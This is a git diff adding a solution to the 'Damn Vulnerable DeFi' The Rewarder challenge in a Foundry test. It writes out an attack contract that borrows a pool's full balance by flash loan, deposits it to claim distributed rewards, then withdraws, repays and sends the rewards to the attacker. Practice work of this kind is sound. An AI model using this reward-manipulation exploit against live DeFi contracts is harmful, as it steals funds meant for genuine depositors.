@@ -10,6 +10,44 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+contract AttackContract {
+    DamnValuableToken public token;
+    FlashLoanerPool public pool;
+    TheRewarderPool public reward;
+    RewardToken public rewardToken;
+    address public owner;
+
+    constructor(DamnValuableToken _token, FlashLoanerPool _pool, TheRewarderPool _reward, RewardToken _rewardToken) {
+        token = _token;
+        pool = _pool;
+        reward = _reward;
+        rewardToken = _rewardToken;
+        owner = msg.sender;
+    }
+
+    function receiveFlashLoan(uint256 amount) public {
+        require(address(pool) == msg.sender, "not pool to call");
+        //deposit
+        token.approve(address(reward), amount);
+        reward.deposit(amount);
+        //withdraw
+        reward.withdraw(amount);
+        //repay
+        token.transfer(address(pool), amount);
+    }
+
+    function attack() public {
+        require(owner == msg.sender, "not owner");
+        uint256 amount = token.balanceOf(address(pool));
+        pool.flashLoan(amount);
+
+        //get reward;
+        reward.distributeRewards();
+        uint256 balance = rewardToken.balanceOf(address(this));
+        rewardToken.transfer(owner, balance);
+    }
+}
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -84,10 +122,17 @@ contract TheRewarder is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitTheRewarder() public {
         /**
          * EXPLOIT START *
          */
+        vm.warp(block.timestamp + 5 days); // 5 days
+        vm.startPrank(attacker);
+        AttackContract attackContract =
+            new AttackContract(dvt, flashLoanerPool, theRewarderPool, theRewarderPool.rewardToken());
+        attackContract.attack();
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
